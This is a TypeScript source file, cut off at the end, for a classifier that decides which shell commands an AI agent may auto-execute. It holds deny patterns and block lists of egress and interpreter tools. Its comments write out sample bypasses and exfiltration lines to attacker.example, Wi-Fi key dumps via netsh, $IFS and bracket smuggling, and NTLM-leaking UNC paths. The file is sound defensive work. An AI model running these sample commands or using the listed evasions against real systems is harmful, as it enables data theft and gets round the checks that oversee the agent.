/**
 * Command safety classifier for AI auto-execution (Whitelist layer).
 *
 * Determines whether a command is "whitelist-safe" — i.e. safe to auto-execute:
 *   1. Reject commands with dangerous shell patterns (redirections, substitutions, chaining, sudo)
 *   2. Split by pipe and evaluate each segment independently
 *   3. Each segment must be covered by the (caller-supplied) whitelist —
 *      a base-command token match, or a multi-token phrase substring match
 *   4. Check for dangerous flags on whitelisted base commands
 *
 * The whitelist is injected by the caller (managed in Settings; defaults live in
 * `commandLists.ts` as DEFAULT_WHITELIST). When in doubt, classify as unsafe.
 */

interface CommandClassification {
    safe: boolean;
    reason: string;
}

// ── Danger patterns (applied before pipe splitting) ─────────────────────────

const DANGER_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
    { pattern: /(?:^|[^|])>/, reason: 'Contains output redirection' },
    { pattern: />>/, reason: 'Contains append redirection' },
    { pattern: /(?:^|[^0-9])<(?![<=])/, reason: 'Contains input redirection' },
    { pattern: /\$\(/, reason: 'Contains command substitution $()' },
    { pattern: /`[^`]*`/, reason: 'Contains command substitution (backticks)' },
    // `ip link$IFS"set"$IFS"eth0"$IFS"down"` is one word to every check here and
    // four to the shell. Nothing legitimate needs to spell a space this way.
    { pattern: /\$\{?IFS\b/, reason: 'Contains $IFS word splitting' },
    { pattern: /(?:^|[^|]);/, reason: 'Contains command chaining (;)' },
    { pattern: /&&/, reason: 'Contains command chaining (&&)' },
    // A lone `&` (not part of `&&`) backgrounds or chains a second command, e.g.
    // `ls & poweroff` — the base command `ls` would otherwise classify safe.
    { pattern: /(?:^|[^&])&(?:[^&]|$)/, reason: 'Contains command chaining/backgrounding (&)' },
    { pattern: /\|\|/, reason: 'Contains command chaining (||)' },
    { pattern: /(?:^|\s)sudo(?:\s|$)/, reason: 'Contains privilege escalation (sudo)' },
    { pattern: /(?:^|\s)su(?:\s|$)/, reason: 'Contains privilege escalation (su)' },
    { pattern: /(?:^|\s)doas(?:\s|$)/, reason: 'Contains privilege escalation (doas)' },
];

/**
 * A grouping bracket outside quotes. PowerShell evaluates `( … )` / `@( … )` in an
 * argument as a command of its own BEFORE the outer one runs, so
 * `echo (iwr https://attacker.example/?k=…)` and `Get-ChildItem (Stop-Computer)`
 * run `iwr` / `Stop-Computer` behind a whitelisted base command — and the base
 * command is all the whitelist, the single-token blacklist and the egress walk
 * look at. In POSIX shells an unquoted `(` opens a subshell, which is just as
 * unsafe. Quoted text is left alone: `grep "foo(" x` and PowerShell's literal
 * `'(…)'` stay safe (`"$(…)"` is already caught by the `$(` pattern above). A
 * network-device regex filter such as `| include (a|b)` now asks instead of
 * auto-running — the safe direction.
 *
 * Braces count too. A PowerShell script block `{ … }` bound to a parameter that
 * takes pipeline input runs once per piped item, so
 * `echo 1 | Get-Content -Path {iwr https://attacker.example/}` runs `iwr` behind
 * two whitelisted commands; a POSIX brace group `{ cmd; }` runs its body too.
 * Quoted braces stay safe (`awk '{print $1}'`); an unquoted `${HOME}` or
 * `find … -exec … {} +` now asks — again the safe direction.
 */
function hasUnquotedGrouping(line: string): boolean {
    return /[(){}]/.test(line.replace(/'[^']*'|"[^"]*"/g, ''));
}

// ── Dangerous flag rules per command ────────────────────────────────────────

interface FlagRule {
    patterns: RegExp[];
    /** Extra test for what a regex can't express (e.g. counting arguments). */
    check?: (segment: string) => boolean;
    reason: string;
}

/** The words of a segment after its base command that are not flags (`-x`, `--x`, `/x`). */
function operands(segment: string): string[] {
    return segment.trim().split(/\s+/).slice(1).filter((t) => !/^[-/]/.test(t));
}

/** The words of a segment after its base command. */
function argWords(segment: string): string[] {
    return segment.trim().split(/\s+/).slice(1);
}

// The read/WRITE network tools below are judged by allow-listing their read
// forms rather than deny-listing write verbs. A deny list kept missing spellings
// the tools accept: iproute2 takes any prefix of a command (`ip r de default`,
// `ip addr fl dev eth0`), `ifconfig eth0 10.0.0.5` changes the address with no
// verb at all, Windows `route ADD` / `route -f` slipped a case-sensitive regex.

// `ip` options, by exact spelling. iproute2 accepts any prefix of an option and
// a `--` spelling too (`--family`, `-fam`, `-lo`), and reading the value of an
// option it did not recognise shifts OBJECT and COMMAND by one word — `ip
// --family inet li set dev eth0 down` then looks like `ip inet li`. So any
// spelling not listed here fails closed rather than being guessed at.
// Options that take a value: `-n <netns>`, `-f <family>`, `-l <loops>`.
const IP_VALUE_OPTIONS = new Set(['-n', '-netns', '-f', '-family', '-l', '-loops', '-rc', '-rcvbuf']);
// Options that take none. `-b` / `-batch` (runs commands from a file) and
// `-force` are left out on purpose.
const IP_FLAG_OPTIONS = new Set([
    '-4', '-6', '-0', '-B', '-M', '-I', '-D',
    '-s', '-stats', '-statistics', '-d', '-details', '-r', '-resolve',
    '-o', '-oneline', '-t', '-timestamp', '-ts', '-tshort', '-br', '-brief',
    '-j', '-json', '-p', '-pretty', '-c', '-color', '-h', '-human', '-iec',
    '-N', '-Numeric', '-a', '-all', '-V', '-Version',
]);
// COMMAND words that can only mean a read. iproute2 matches any prefix and, for
// some objects, tries write verbs first, so a bare `s` / `a` / `l` may mean
// `set` / `add` / … and is left out on purpose.
const IP_READ_COMMANDS = new Set(['show', 'sho', 'sh', 'list', 'lis', 'li', 'lst', 'ls', 'get', 'ge']);

/** `ip [OPTIONS] [OBJECT [COMMAND …]]` where COMMAND, if given, is a read. */
function isReadOnlyIp(segment: string): boolean {
    const words = argWords(segment);
    let i = 0;
    while (i < words.length && words[i].startsWith('-')) {
        // iproute2 drops one dash from `--x`; option names are case-sensitive.
        const opt = words[i].replace(/^--/, '-').replace(/=.*$/, '');
        if (IP_VALUE_OPTIONS.has(opt) && !words[i].includes('=')) i++;
        else if (!IP_FLAG_OPTIONS.has(opt) && !IP_VALUE_OPTIONS.has(opt)) return false;
        i++;
    }
    // Options only, or `OBJECT` alone (`ip a`, `ip -s link`) — both print.
    if (i + 1 >= words.length) return true;
    return IP_READ_COMMANDS.has(words[i + 1].toLowerCase());
}

/**
 * `ifconfig`, `ifconfig -a`, `ifconfig eth0`: at most one operand (the interface)
 * and only listing flags. A second word is an address, `up`, `delete`, `destroy`;
 * a flag such as `-promisc` / `-arp` after the interface also reconfigures it.
 */
function isReadOnlyIfconfig(segment: string): boolean {
    const words = argWords(segment);
    const flags = words.filter((w) => w.startsWith('-'));
    return words.length - flags.length <= 1 && flags.every((f) => /^-[asvludmLC]+$/.test(f));
}

/**
 * `route`, `route -n`, `route -ee`, `route -A inet6` (Linux), `route print`
 * (Windows), `route get <dst>` / `route show` (BSD). A Windows `/x` switch is
 * treated like a flag.
 */
function isReadOnlyRoute(segment: string): boolean {
    const words = argWords(segment);
    let i = 0;
    while (i < words.length && /^[-/]/.test(words[i])) {
        const f = words[i];
        if (f === '-A' || f === '--family') {
            i += 2;
            continue;
        }
        if (!/^-(?:[nevC46]+|-(?:numeric|extend|verbose|cache))$/.test(f)) return false;
        i++;
    }
    return i >= words.length || /^(?:print|get|show)$/i.test(words[i]);
}

/**
 * `arp`, `arp -a [host]`, `arp -n`, `arp -e`, `arp -g`, `arp -v`, and the value
 * options `-N <if>` (Windows), `-i <if>`, `-H`/`-t <type>`. Anything else —
 * `-d`, `-s`, `-f`, `--delete`, `--set`, `--file` — writes the cache. Operands
 * (a host, an interface) are reads either way.
 */
function isReadOnlyArp(segment: string): boolean {
    return argWords(segment)
        .filter((w) => /^[-/]/.test(w))
        .every(
            (f) =>
                /^[-/][aAgGnNevViHt]+$/.test(f) ||
                /^--(?:all|numeric|verbose|device|hw-type)(?:=.*)?$/.test(f),
        );
}

// Verbs that change netsh state. netsh accepts any unambiguous prefix of a
// command, so `netsh int ip se addr …` is `set` and `netsh int ip a addr …` is
// `add`; every prefix of these counts.
const NETSH_WRITE_VERBS = [
    'set', 'add', 'delete', 'reset', 'export', 'import', 'exec', 'install', 'uninstall',
    'flush', 'renew', 'connect', 'disconnect', 'reconnect', 'start', 'stop',
];

/** A netsh segment as netsh reads it: quotes and cmd `^` escapes removed. */
function netshText(segment: string): string {
    return segment.replace(/["'`^]/g, '');
}

function netshHasWriteVerb(segment: string): boolean {
    return argWords(segment).some((w) => {
        const t = w.toLowerCase();
        return /^[a-z]+$/.test(t) && NETSH_WRITE_VERBS.some((v) => v.startsWith(t));
    });
}

/**
 * Whether `date` is given an operand that sets the clock. GNU `date MMDDhhmm…`
 * and BSD `date [[[[cc]yy]mm]dd]HH]MM` set it from a bare operand; only a
 * `+FORMAT` operand prints. Quoted text is joined into one word first so
 * `date +"%Y %m"` and `date -d "next monday"` read as one operand each.
 */
function dateSetsClock(segment: string): boolean {
    const joined = segment.replace(/(["'])(.*?)\1/g, (_m, _q, body: string) => body.replace(/\s/g, '_'));
    const words = argWords(joined);
    for (let i = 0; i < words.length; i++) {
        const w = words[i];
        if (/^(?:-[drfv]|--(?:date|reference|file))$/.test(w)) {
            i++; // the option's value
            continue;
        }
        if (w.startsWith('-')) continue;
        if (!w.startsWith('+')) return true;
    }
    return false;
}

const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
    find: [
        { patterns: [/-delete\b/], reason: 'find with -delete' },
        { patterns: [/-exec\b/], reason: 'find with -exec' },
    ],
    curl: [
        { patterns: [/-X\s*(POST|PUT|DELETE|PATCH)\b/i], reason: 'curl with write method' },
        { patterns: [/(?:^|\s)(?:-d|--data|--data-\w+)\b/], reason: 'curl with data payload' },
        { patterns: [/(?:^|\s)(?:--upload-file|-T)\b/], reason: 'curl with file upload' },
    ],
    wget: [
        { patterns: [/--post-data\b/, /--post-file\b/], reason: 'wget with POST data' },
    ],
    sed: [
        { patterns: [/(?:^|\s)-i\b/], reason: 'sed with in-place edit (-i)' },
    ],
    git: [
        { patterns: [/\b(?:push|reset|checkout|merge|rebase|rm|clean|stash)\b/], reason: 'git write operation' },
    ],
    apt: [
        { patterns: [/\b(?:install|remove|upgrade|update|purge|autoremove)\b/], reason: 'apt package modification' },
    ],
    dpkg: [
        { patterns: [/(?:^|\s)(?:-i|--install|-r|--remove|-P|--purge)\b/], reason: 'dpkg package modification' },
    ],
    rpm: [
        { patterns: [/(?:^|\s)(?:-i|--install|-e|--erase|-U|--upgrade)\b/], reason: 'rpm package modification' },
    ],
    // Read/WRITE network + kernel tools: whitelisted for their read-only queries
    // (`ip addr show`, `netsh interface show`, `sysctl -a`), but their write
    // forms reconfigure the box / cut the management link and must never
    // auto-execute. `ip` / `ifconfig` / `route` / `arp` allow only their read
    // forms (see isReadOnlyIp and its neighbours); the others reject write forms.
    ip: [
        // `ip netns exec <ns> <cmd>` runs any program; `-b`/`-batch` runs commands from a file.
        { patterns: [/(?:^|\s)(?:exec|-b|-batch|-force)\b/], reason: 'ip runs another command' },
        { patterns: [], check: (seg) => !isReadOnlyIp(seg), reason: 'ip command other than show/list/get' },
    ],
    ifconfig: [
        { patterns: [], check: (seg) => !isReadOnlyIfconfig(seg), reason: 'ifconfig interface reconfiguration' },
    ],
    route: [
        { patterns: [], check: (seg) => !isReadOnlyRoute(seg), reason: 'route command other than print/get/show' },
    ],
    arp: [
        { patterns: [], check: (seg) => !isReadOnlyArp(seg), reason: 'arp cache modification' },
    ],
    netsh: [
        // `-a` / `-f` / `-r` and the "no read verb" rule live in EGRESS_OPTION_RULES
        // below, so they apply on every strategy.
        // `netsh wlan export profile key=clear folder=…` writes every saved Wi-Fi
        // password to disk; `exec` runs a script; the rest change state. Matched
        // as prefixes, since netsh accepts abbreviated commands.
        { patterns: [], check: netshHasWriteVerb, reason: 'netsh configuration change, state change or file write' },
    ],
    sysctl: [
        // `sysctl -w key=val` or `sysctl key=val` writes kernel parameters.
        { patterns: [/(?:^|\s)-w\b/, /=/], reason: 'sysctl kernel parameter write' },
        // `-p` / `-f` / `--system` / `--load` apply every setting in a file.
        { patterns: [/(?:^|\s)-[A-Za-z]*[pf]/, /(?:^|\s)--(?:load|system|write)\b/], reason: 'sysctl loads settings from a file' },
    ],
    dmesg: [
        { patterns: [/(?:^|\s)(?:-c|-C|--clear|--read-clear)\b/], reason: 'dmesg ring-buffer clear' },
    ],
    // Whitelisted read tools with an option that runs another program or writes a
    // file. The whitelist note ("redirections are blocked structurally") assumed
    // they could only print — these options are the exceptions.
    rg: [
        // `rg --pre=rm x file` runs `rm file` for every file searched.
        { patterns: [/(?:^|\s)--(?:pre|hostname-bin)\b/], reason: 'rg runs another program (--pre)' },
    ],
    sort: [
        { patterns: [/(?:^|\s)-[A-Za-z]*o/, /(?:^|\s)--(?:output|compress-program)\b/], reason: 'sort writes a file (-o)' },
    ],
    uniq: [
        // `uniq IN OUT` overwrites OUT.
        // `-f N` / `-s N` / `-w N` take a value, which is not a file.
        { patterns: [], check: (seg) => operands(seg.replace(/\s-[fsw]\s+\S+/g, '')).length >= 2, reason: 'uniq writes an output file' },
    ],
    tree: [
        // `-o FILE` writes the listing; `-R` with `-H` writes an index into every directory.
        { patterns: [/(?:^|\s)-[A-Za-z]*[oR]/, /(?:^|\s)--output\b/], reason: 'tree writes files (-o / -R)' },
    ],
    file: [
        { patterns: [/(?:^|\s)(?:-C|--compile)\b/], reason: 'file writes a compiled magic file (-C)' },
    ],
    date: [
        { patterns: [/(?:^|\s)(?:-s|--set)\b/], check: dateSetsClock, reason: 'date sets the system clock' },
    ],
    hostname: [
        // A bare `hostname` / `hostname -I` prints; a name argument or a file sets it.
        { patterns: [/(?:^|\s)(?:-F|--file|-b|--boot)\b/], check: (seg) => operands(seg).length > 0, reason: 'hostname sets the host name' },
    ],
    history: [
        // `-c`/`-d` erase it; `-w`/`-a` write it to a file; `-r`/`-n` read one in.
        { patterns: [/(?:^|\s)-[A-Za-z]*[cdwarnps]/], reason: 'history clear or file write' },
    ],
    ss: [
        { patterns: [/(?:^|\s)(?:-[A-Za-z]*K|--kill)\b/], reason: 'ss kills sockets (-K)' },
    ],
    ipconfig: [
        // `/release` cuts the network the session itself runs over.
        { patterns: [/(?:^|\s)[/-](?:release6?|renew6?|flushdns|registerdns|setclassid6?)\b/i], reason: 'ipconfig changes network state' },
    ],
    diagnose: [
        // FortiOS: `diagnose sys session clear` drops every session, `diagnose sys kill` …
        { patterns: [/(?:^|\s)(?:clear|kill|killall|reset|reset-\S+|restart|reboot|shutdown|flush|delete|del|purge|format|erase|update|upload|disconnect|stop|start)\b/i], reason: 'diagnose state change' },
    ],
};

// ── Egress options ──────────────────────────────────────────────────────────
//
// Read tools that become an exfiltration channel with one option or subcommand.
// These are network-egress floor rules (see networkEgressDanger), so they stop
// the command on every strategy; they used to sit only in DANGEROUS_FLAGS, which
// the whitelist path alone consults, so in `hybrid`/`ai` the same command went
// to the AI verdict instead. They are merged into DANGEROUS_FLAGS below as well,
// so classifyCommand on its own still rejects them.
//
// Lookups sent to a server the command line picks are an exfiltration channel
// (`dig @203.0.113.5 <data>.x`). Lookups through the configured resolver still
// auto-run: a name such as `<data>.attacker.example` can still leak through
// DNS, which no flag rule can close without blocking these tools outright.
const EGRESS_OPTION_RULES: Record<string, FlagRule[]> = {
    dig: [
        { patterns: [/(?:^|\s)@\S/], reason: 'dig asks a server named on the command line (@server)' },
    ],
    nslookup: [
        // `nslookup NAME SERVER` — the second operand is the server to ask.
        { patterns: [], check: (seg) => operands(seg).length >= 2, reason: 'nslookup asks a server named on the command line' },
    ],
    host: [
        // `host [-t type] NAME SERVER`; `-t`/`-c`/`-W`/`-N`/`-R`/`-m` take a value.
        { patterns: [], check: (seg) => operands(seg.replace(/\s-[tcWNRm]\s+\S+/g, '')).length >= 2, reason: 'host asks a server named on the command line' },
    ],
    'resolve-dnsname': [
        // `-Server` (PowerShell takes any unambiguous prefix, `-se`).
        { patterns: [/(?:^|\s)-se\w*/i], reason: 'Resolve-DnsName asks a server named on the command line (-Server)' },
    ],
    ping: [
        // `ping -p <hex>` (Linux) fills the payload with chosen bytes.
        { patterns: [/(?:^|\s)-[A-Za-z]*p/], reason: 'ping with a chosen payload (-p)' },
    ],
    ping6: [
        { patterns: [/(?:^|\s)-[A-Za-z]*p/], reason: 'ping with a chosen payload (-p)' },
    ],
    // `git ls-remote https://attacker.example/?d=…` — any URL, any data.
    git: [
        {
            patterns: [/(?:^|\s)(?:ls-remote|fetch|clone|pull|push|request-pull|send-email|archive\s+--remote|remote\s+(?:update|show|prune)|submodule\s+(?:update|sync|add))\b/],
            reason: 'git contacts a remote repository',
        },
    ],
    openssl: [
        { patterns: [/(?:^|\s)(?:s_client|s_time|ocsp)\b/], reason: 'openssl connects to a server' },
    ],
    // `netsh wlan show profile name=corp key=clear` prints the saved Wi-Fi key in
    // plain text, and terminal output goes to the AI provider. Loose on purpose:
    // netsh takes tags and values case-insensitively and abbreviated, and the
    // quotes and cmd `^` escapes in `k"ey"=^clear` are gone before netsh sees it.
    // Tag names are optional too — values bind in order — so `netsh wlan show
    // profile corp clear` is key=clear, and any word that is `clear` (or a
    // prefix of it) is treated as one.
    netsh: [
        {
            patterns: [],
            check: (seg) => {
                const s = netshText(seg);
                if (/(?:^|\s)k[a-z]*\s*=\s*c/i.test(s)) return true;
                // A bare value in key's place: `clear`, `cle`, `c`.
                return s.split(/\s+/).some((w) => ['c', 'cl', 'cle', 'clea', 'clear'].includes(w.toLowerCase()));
            },
            reason: 'netsh shows a saved Wi-Fi key in plain text (key=clear)',
        },
        // cmd rewrites `%…%` / `!…!` before netsh runs, so `key=%COMSPEC:~…%`
        // can spell clear (or a verb) out of sight of every rule here.
        { patterns: [/[%!]/], reason: 'netsh with a cmd variable (% / !) — the words it runs are not the ones written' },
        // `-a <alias file>` and `-f <script>` run commands from a file, `-r`
        // targets another machine.
        { patterns: [], check: (seg) => /(?:^|\s)[-/][afr](?:\s|$)/i.test(netshText(seg)), reason: 'netsh runs commands from a file (-a / -f) or targets another machine (-r)' },
        // A bare `netsh`, `netsh wlan` or `netsh -c show` opens netsh's own
        // prompt, and the next line (`show profile corp key=clear`) is typed
        // into it, out of sight of every check here. Without a read verb the
        // rest are writes anyway. Option values (`-c show`) are not verbs.
        {
            patterns: [],
            check: (seg) => !/(?:^|\s)(?:show|sho|sh|dump|help|\?)(?:\s|$)/i.test(
                netshText(seg).replace(/(?:^|\s)[-/][acrupf]\s+\S+/gi, ' '),
            ),
            reason: 'netsh without a show / dump / help verb opens its own prompt or changes settings',
        },
    ],
};

for (const [cmd, rules] of Object.entries(EGRESS_OPTION_RULES)) {
    DANGEROUS_FLAGS[cmd] = [...(DANGEROUS_FLAGS[cmd] ?? []), ...rules];
}

// ── Prefix wrappers ─────────────────────────────────────────────────────────
//
// Programs whose job is to run ONE other command line, handed to them as their
// remaining words: `timeout 5 curl …`, `flock /tmp/l curl …`,
// `nsenter -t 1 -n curl …`. What sits between the wrapper and the command varies
// per wrapper (a flag, a count, a lock file, a directory, a user name), so the
// egress floor does not try to find where the command starts — it scans every
// remaining word of the segment (see {@link commandPositions}). A wrapper in
// front of `grep ssh file` therefore asks instead of auto-running, which is the
// safe direction and rare in practice.
const PREFIX_WRAPPERS: Set<string> = new Set([
    'env', 'xargs', 'nohup', 'setsid', 'stdbuf', 'nice', 'ionice', 'timeout', 'watch', 'time',
    // Shell built-ins that run a program: `command curl …`, `exec curl …`
    'command', 'exec',
    // Multi-call binaries: `busybox wget …`
    'busybox', 'toybox',
    // Run a command under a lock / root / namespace / user / CPU or scheduler policy
    'flock', 'chroot', 'nsenter', 'unshare', 'runuser', 'taskset', 'chrt', 'numactl',
    // Tracers, pty and session wrappers
    'strace', 'ltrace', 'unbuffer', 'script', 'screen', 'tmux', 'parallel',
    // Proxy / sandbox wrappers
    'proxychains', 'proxychains4', 'torsocks', 'tsocks', 'firejail', 'systemd-run',
    // Windows: `start curl …`, `Start-Process curl`, `iex (iwr …)`
    'start', 'start-process', 'saps', 'iex', 'invoke-expression',
    // Dot-source / source: `. iwr …` runs the cmdlet in PowerShell, and
    // `| . /dev/stdin` runs a piped program in sh.
    '.', 'source',
]);

// Words that start an embedded command line mid-segment, after a program that is
// not itself a wrapper: `ip netns exec ns curl …`, `docker exec c curl …`,
// `kubectl exec pod -- curl …`, `find . -exec curl {} +`.
const EXEC_MARKERS: Set<string> = new Set(['exec', '-exec', '-execdir', '-ok', '-okdir']);

// ── Runner / interpreter commands ────────────────────────────────────────────
//
// Commands that can execute or interpret arbitrary code, or have a documented
// exec / file-write escape hatch, so a base-command whitelist can't make them
// "safe" (env <cmd>, awk 'system()', sed …e / w, find -execdir, git -c pager,
// any shell/interpreter). These never take the whitelist auto-exec fast path —
// they fall through to the AI verdict (hybrid) or a manual ask (static).
// Deliberately broad: better to ask/AI-judge once than auto-run a shell.
const RUNNER_COMMANDS: Set<string> = new Set([
    // Command runners / wrappers
    ...PREFIX_WRAPPERS,
    // Interpreters
    'awk', 'gawk', 'mawk', 'sed', 'perl', 'python', 'python2', 'python3', 'ruby', 'node',
    'php', 'lua', 'tclsh', 'expect', 'osascript', 'py', 'pypy', 'pypy3', 'bun', 'deno',
    // Shells
    'sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh', 'ash', 'pwsh', 'powershell', 'cmd', 'wsl',
    // Whitelisted read tools with exec / file-write escapes
    'find', 'git', 'set',
    // Editors / pagers that can shell out (`:!cmd`, `!cmd`, `$PAGER`)
    'vi', 'vim', 'nvim', 'emacs', 'nano', 'ed', 'less', 'more', 'man',
]);

// ── Network-egress / scanning commands ──────────────────────────────────────
//
// Tools that can ship the model's context off the box (or scan the network) in a
// single read-shaped invocation. `commandLists.ts` states the rule — curl/wget/
// nmap "must never auto-execute in auto-execute-safe mode" — but leaving them
// merely un-whitelisted did NOT enforce it: in `hybrid`/`ai` they fall through to
// the AI verdict, and a plain GET (`curl https://host/?x=<data>`) is commonly
// rated read-only, so it auto-ran. Terminal output from a hostile host is fed to
// the model, so that is a working exfiltration path.
//
// This lives in code rather than in DEFAULT_BLACKLIST on purpose: the blacklist
// is user-editable and seeded once, so a user who resets or prunes it would
// silently lose the guard. As a floor it also applies to all three strategies.
const NETWORK_EGRESS_COMMANDS: Set<string> = new Set([
    // Transfer / fetch
    'curl', 'wget', 'ftp', 'tftp', 'scp', 'sftp', 'rsync',
    // Raw sockets / tunnels
    'nc', 'ncat', 'netcat', 'socat', 'telnet', 'ssh',
    // Scanners
    'nmap', 'masscan', 'zmap',
    // Sends its argument as free text to any host given by `-h` (and to a
    // third-party registry otherwise): `whois -h attacker.example -p 80 "<data>"`
    'whois',
    // Windows living-off-the-land downloaders
    'bitsadmin', 'certutil', 'start-bitstransfer',
    'invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm',
    // `(New-Object Net.WebClient).DownloadString(…)` — the brackets alone trip the
    // grouping floor, but not inside `pwsh -c "…"`, where they are quoted.
    'new-object',
    // Fetch and run a remote file: `mshta http://…`, `regsvr32 /i:http://… scrobj.dll`,
    // `msiexec /i http://…`
    'mshta', 'regsvr32', 'msiexec',
    // Mail, TCP probes, and more transfer clients
    'send-mailmessage', 'test-netconnection', 'tnc',
    'smbclient', 'rclone', 'aria2c', 'lftp',
]);

// ── Inline code ─────────────────────────────────────────────────────────────
//
// Interpreters handed program text on the command line. That text is code, not
// words, so the command-position walk cannot look inside it:
// `python3 -c "__import__('urllib.request').request.urlopen('http://x/?d=…')"`
// keeps its brackets inside quotes, and `pwsh -EncodedCommand <base64>` hides
// everything. Each entry tests one argument word for the inline-code option.
const INLINE_CODE_OPTIONS: Record<string, (word: string) => boolean> = {
    python: (w) => /^-[A-Za-z]*c$/.test(w),
    node: (w) => /^-[A-Za-z]*[ep]$/.test(w) || /^--(?:eval|print)(?:=|$)/.test(w),
    perl: (w) => /^-[A-Za-z]*[eE]$/.test(w),
    ruby: (w) => /^-[A-Za-z]*e$/.test(w),
    php: (w) => /^-[A-Za-z]*r$/.test(w),
    lua: (w) => /^-[A-Za-z]*e$/.test(w),
    osascript: (w) => w === '-e',
    // `-Command` / `-EncodedCommand` / `-CommandWithArgs` and any prefix
    // PowerShell accepts (`-c`, `-enc`, `-ec`, `-cwa`), with `-` or `/`; `-`
    // alone reads the program from stdin.
    pwsh: (w) => {
        const m = /^[-/]([A-Za-z]*)$/.exec(w);
        if (!m) return false;
        const p = m[1].toLowerCase();
        return p === '' || p === 'ec' || p === 'cwa' || 'command'.startsWith(p)
            || 'encodedcommand'.startsWith(p) || 'commandwithargs'.startsWith(p);
    },
    // `bash -c …`, also bundled (`-xc`). The command-position walk reaches the
    // first word of the program, but not past an option value (`bash -o posix
    // -c …`) or a `+x` option, and not into a quoted program it cannot split.
    sh: (w) => /^-[A-Za-z]*c[A-Za-z]*$/.test(w),
    // `cmd /c …`, `/k …`, `/r …`, also glued to the command (`/ccurl`).
    cmd: (w) => /^\/[ckr]/i.test(w),
};

// POSIX shells share the `sh` entry above.
const SH_FAMILY: Set<string> = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh', 'ash']);

// Shells and interpreters that read a program from stdin when piped into:
// `echo 'curl https://attacker.example/' | sh`. The program is data on the left
// of the pipe, out of the walk's reach. Keyed by {@link interpreterFamily}.
const STDIN_INTERPRETERS: Set<string> = new Set([
    'sh', 'pwsh', 'cmd', 'python', 'node', 'perl', 'ruby', 'php', 'lua', '.', 'source',
    // `echo wlan show profile corp key=clear | netsh` — netsh reads commands from stdin.
    'netsh',
]);

// PowerShell options that take a value, by full name, and the short aliases it
// documents. A prefix of three letters or more also counts; shorter guesses do
// not, so an unknown short option makes the next word code (the safe reading).
const PWSH_VALUE_OPTIONS = [
    'executionpolicy', 'windowstyle', 'outputformat', 'inputformat', 'workingdirectory',
    'configurationname', 'configurationfile', 'custompipename', 'settingsfile', 'version',
    'psconsolefile',
];
const PWSH_VALUE_ALIASES = new Set(['ep', 'ex', 'w', 'wd', 'o', 'of', 'if', 'v']);

function pwshTakesValue(p: string): boolean {
    return PWSH_VALUE_ALIASES.has(p) || (p.length >= 3 && PWSH_VALUE_OPTIONS.some((o) => o.startsWith(p)));
}

/**
 * Whether an interpreter's own options (the flags before its script name or
 * first operand) include its inline-code option. Arguments after the script
 * belong to the script: `python3 app.py -c settings.ini` is not inline code.
 *
 * A word right after an option may be that option's value (`pwsh
 * -ExecutionPolicy Bypass -c …`, `python3 -W ignore -c …`), so the scan goes on
 * past it; only a word that does not follow an option starts the script. Which
 * options take a value is not tracked, so `python3 -u app.py -c x` is read as
 * inline code too — that only means the user is asked.
 *
 * PowerShell is read by its own rules: its value-taking options are known, a
 * `-File` ends the options, and a bare word is the program for Windows
 * PowerShell (`powershell iwr …` runs as `-Command`) but the script for pwsh 7.
 */
function hasInlineCode(name: string, family: string, args: string[]): boolean {
    const isInline = INLINE_CODE_OPTIONS[family];
    if (!isInline) return false;
    // PowerShell takes `-x` and `/x`, cmd `/x`, POSIX shells `-x` and `+x`;
    // elsewhere a leading `/` is a script path.
    const isOption = family === 'pwsh' ? /^[-/]/ : family === 'cmd' ? /^\// : family === 'sh' ? /^[-+]/ : /^-/;
    let afterOption = false;
    let valueNext = false;
    for (const w of args) {
        if (!isOption.test(w)) {
            if (family === 'pwsh') {
                if (valueNext) {
                    valueNext = false;
                    continue;
                }
                return name === 'powershell';
            }
            if (!afterOption) return false;
            afterOption = false;
            continue;
        }
        if (isInline(w)) return true;
        afterOption = true;
        if (family === 'pwsh') {
            const p = w.slice(1).toLowerCase();
            if (p.length > 0 && 'file'.startsWith(p)) return false;
            valueNext = !w.includes(':') && pwshTakesValue(p);
        }
    }
    return false;
}

/**
 * `python3.11` → `python`, `powershell` → `pwsh`, `bash` → `sh`, so one entry
 * covers each family.
 */
function interpreterFamily(name: string): string {
    if (name === 'powershell') return 'pwsh';
    if (name === 'py' || name === 'pypy' || name === 'pypy3') return 'python';
    if (name === 'bun') return 'node';
    if (SH_FAMILY.has(name)) return 'sh';
    return name.replace(/\d+(?:\.\d+)*$/, '');
}

/**
 * Whether a word names a path on another machine: `\\host\share\x`, `//host/x`,
 * `\\?\UNC\host\share`, also behind a parameter (`-Path:\\host\x`,
 * `--file=\\host\x`) or a provider prefix (`FileSystem::\\host\x`). Opening one
 * makes an SMB connection (WebDAV for `\\host@SSL\…`) from this PC, which sends
 * the user's NTLM hash and leaks whatever is spelled into the host name — so
 * whitelisted readers such as `Get-Content`, `dir` and `type` become egress
 * tools. The local device namespaces `\\?\C:\…` and `\\.\…` and WSL's local
 * `\\wsl$\…` / `\\wsl.localhost\…` are not remote.
 */
function namesRemotePath(word: string): boolean {
    const t = stripTokenQuotes(word.replace(/^-{1,2}[\w-]+[:=]/, '').replace(/^.*::/, ''));
    if (/^\\\\\?\\UNC\\/i.test(t)) return true;
    if (/^\\\\[?.]\\/.test(t)) return false;
    if (/^\\\\wsl(?:\$|\.localhost)\\/i.test(t)) return false;
    return /^(?:\\\\|\/\/)[^\\/\s]/.test(t);
}

/**
 * Strip a segment's base command down to a comparable name: drop any directory
 * prefix (`/usr/bin/curl`, `C:\Windows\System32\certutil.exe`) and a trailing
 * `.exe`, then lowercase. Without this, a fully-qualified path walks straight
 * past a bare-name Set lookup.
 */
function normalizeBaseCommand(base: string): string {
    const leaf = base.split(/[\\/]/).pop() ?? base;
    return leaf.toLowerCase().replace(/\.exe$/, '');
}

/**
 * Drop surrounding quotes and grouping brackets. A segment is split on
 * whitespace, so the command word inside `bash -c 'curl …'` arrives still
 * carrying the opening quote, and the one in PowerShell's `iex (iwr …)` its
 * opening parenthesis.
 */
function stripTokenQuotes(tok: string): string {
    return tok.replace(/^['"`({]+/, '').replace(/['"`)}]+$/, '');
}

/**
 * A word as the shell will run it: outer quotes and brackets dropped, and the
 * quotes and PowerShell backtick escapes inside it removed — `c""url`, `c'u'rl`
 * and `` c`url `` all run curl.
 */
function commandWord(tok: string): string {
    return stripTokenQuotes(tok).replace(/["'`]/g, '');
}

/**
